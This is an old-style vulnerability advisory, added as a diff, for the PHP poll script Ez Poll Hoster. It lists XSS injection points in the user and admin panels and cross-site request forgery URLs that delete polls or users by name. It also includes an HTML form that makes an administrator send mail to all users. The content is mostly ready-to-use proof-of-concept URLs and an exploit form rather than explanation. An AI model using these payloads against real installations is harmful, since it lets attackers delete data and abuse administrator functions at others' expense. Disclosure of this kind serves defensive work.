@@ -1,0 +1,66 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Ez Poll Hoster Multiple XSS and XSRF Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 14. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Ez Poll Hoster
+[#] Version: the only one there is
+[#] Platform: PHP
+[#] Link: http://www.scriptsez.net/?action=details&cat=Polls%20and%20Voting&id=1193942206
+[#] Price: 15 USD
+[#] Vulnerability: Multiple XSS and XSRF Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--User panel
+ |  |--XSS in user panel
+ |  |--Delete poll by name
+ |
+ |--Admin panel
+    |--XSS in admin panel
+    |--Delete user by name
+    |--Email all users
+
+[#]User panel
+
+[-]XSS in user panel
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/eph/index.php?action=code&pid=[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Delete poll by name
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/eph/index.php?action=delete_poll&pid=[POLL
+NAME]&do=true&is_js_confirmed=1
+[POC----------------------------------------------------------------------------------------------]
+
+[#]Admin panel
+
+[-]XSS in admin panel
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/eph/profile.php?action=view&uid=[XSS]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Delete user by name
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/eph/admin.php?action=manage&do=delete&uid=[USER
+NAME]&is_js_confirmed=1
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Email all users
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/eph/admin.php?action=email&do=true"
+method="post">
+  <input type="hidden" name="subject" value="this is my subject">
+  <input type="hidden" name="message" value="this is my message">
+  <input type="submit" name="submit" value="Submit">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#] EOF
